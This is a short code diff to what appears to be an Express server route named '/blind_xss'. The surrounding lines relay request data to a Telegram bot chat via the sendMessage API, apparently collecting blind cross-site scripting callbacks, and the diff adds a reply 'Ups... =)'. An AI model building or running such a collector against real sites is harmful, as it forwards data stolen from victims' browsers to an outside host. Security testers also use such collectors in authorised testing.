@@ -21,6 +21,7 @@ app.get('/blind_xss', async (req, res) => {
     let searchQuery = `chat_id=${user}&disable_web_page_preview=1&parse_mode=html&text=${text}`;
     let url = `https://api.telegram.org/bot${key}/sendMessage?${searchQuery}`;
     await fetch(url);
+    res.send('Ups... =)');
 });
 
 app.use(express.static('public'))
